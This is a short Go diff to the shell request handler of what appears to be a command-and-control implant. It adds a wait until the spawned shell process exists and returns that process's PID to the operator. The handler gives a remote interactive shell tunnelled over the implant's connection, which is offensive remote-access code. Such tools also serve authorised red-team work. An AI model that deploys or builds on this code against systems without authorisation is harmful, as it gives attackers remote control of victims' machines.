@@ -20,6 +20,7 @@ package handlers
 
 import (
 	"io"
+	"time"
 
 	// {{if .Debug}}
 	"log"
@@ -108,6 +109,14 @@ func shellReqHandler(envelope *pb.Envelope, connection *transports.Connection) {
 	shellPath := shell.GetSystemShellPath(shellReq.Path)
 	systemShell := shell.StartInteractive(shellReq.TunnelID, shellPath, shellReq.EnablePTY)
 	go systemShell.StartAndWait()
+	// Wait for the process to actually spawn
+	for {
+		if systemShell.Command.Process == nil {
+			time.Sleep(time.Second)
+		} else {
+			break
+		}
+	}
 	tunnel := &transports.Tunnel{
 		ID:     shellReq.TunnelID,
 		Reader: systemShell.Stdout,
@@ -115,7 +124,10 @@ func shellReqHandler(envelope *pb.Envelope, connection *transports.Connection) {
 	}
 	connection.AddTunnel(tunnel)
 
-	shellResp, _ := proto.Marshal(&pb.Shell{Success: true})
+	shellResp, _ := proto.Marshal(&pb.Shell{
+		Success: true,
+		Pid:     uint32(systemShell.Command.Process.Pid),
+	})
 	connection.Send <- &pb.Envelope{
 		ID:   envelope.ID,
 		Data: shellResp,
